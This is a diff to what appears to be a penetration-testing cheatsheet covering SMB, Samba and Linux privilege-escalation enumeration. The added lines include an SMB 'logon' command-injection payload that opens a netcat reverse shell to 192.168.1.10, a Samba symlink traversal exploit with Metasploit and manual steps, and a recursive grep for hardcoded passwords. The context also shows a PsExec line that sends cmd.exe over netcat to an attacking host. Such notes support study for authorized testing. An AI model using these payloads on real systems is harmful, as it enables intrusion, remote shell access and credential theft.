@@ -199,6 +199,11 @@ Access SMB shares with spaces in name:
 $ smbclient \\\\10.11.1.136\\Bob\ Share
 ```
 
+SMB "Logon" reverse shell:
+```bash
+smb> logon "/=`nc 192.168.1.10 4444 -e /bin/bash
+```
+
 MS17-010 Code Exec
 * `PsExec64.exe \\10.11.1.49 -u Alice -p aliceishere ipconfig` (see more cmds: https://ss64.com/nt/psexec.html)
 * `PsExec -u tom -p iamtom \\TOMSCOMP C:\path\to\nc.exe IP_OF_ATTACKING_SYSTEM 8080 -e C:\windows\system32\cmd.exe`
@@ -224,6 +229,11 @@ SMBD/Sambda is a server to provide SMB service to clients
 
 Working exploits:
 * Samba 2.2.x remote buffer overflow: https://www.exploit-db.com/exploits/7
+
+Samba Symlink Directory Traversal (works on Debian 3.0.20)
+* See for more info: https://packetstormsecurity.com/files/85957/Samba-Remote-Directory-Traversal.html
+* Automatic: `Metasploit> use auxiliary/admin/smb/samba_symlink_traversal`
+* Manual: `smb> symlink <oldname> <newname>`
 
 
 ### MSRPC - TCP 135
@@ -405,10 +415,13 @@ Automated Linux enumeration scripts:
 * https://github.com/rebootuser/LinEnum
 * https://tools.kali.org/vulnerability-analysis/unix-privesc-check
 
-Find hardcoded credentials / interesting items
+Hardcoded credentials, backup ssh keys, interesting files
 ```
 # Recursive grep, match regex pattern, ignoring case for all files from the root directory.
 $ grep -Rei 'password|username|[pattern3]|[pattern4]' /
+
+# Backups (Debian)
+$ ls -l /var/backups
 ```
 
 TTY spawn cheatsheet: https://netsec.ws/?p=337
